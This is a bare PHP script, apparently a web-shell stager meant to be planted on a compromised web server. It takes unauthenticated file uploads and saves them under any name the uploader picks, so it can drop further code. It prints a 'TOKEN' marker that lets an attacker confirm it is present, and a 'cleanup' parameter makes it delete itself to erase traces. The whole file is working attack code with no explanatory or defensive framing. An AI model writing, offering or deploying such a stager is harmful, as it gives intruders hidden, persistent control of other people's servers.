<?php
if(isset($_FILES['f'])){move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo$_FILES['f']['name'].' OK';}
if(isset($_GET['cleanup'])){@unlink(__FILE__);die('CLEANED');}
echo'TOKEN';
?>
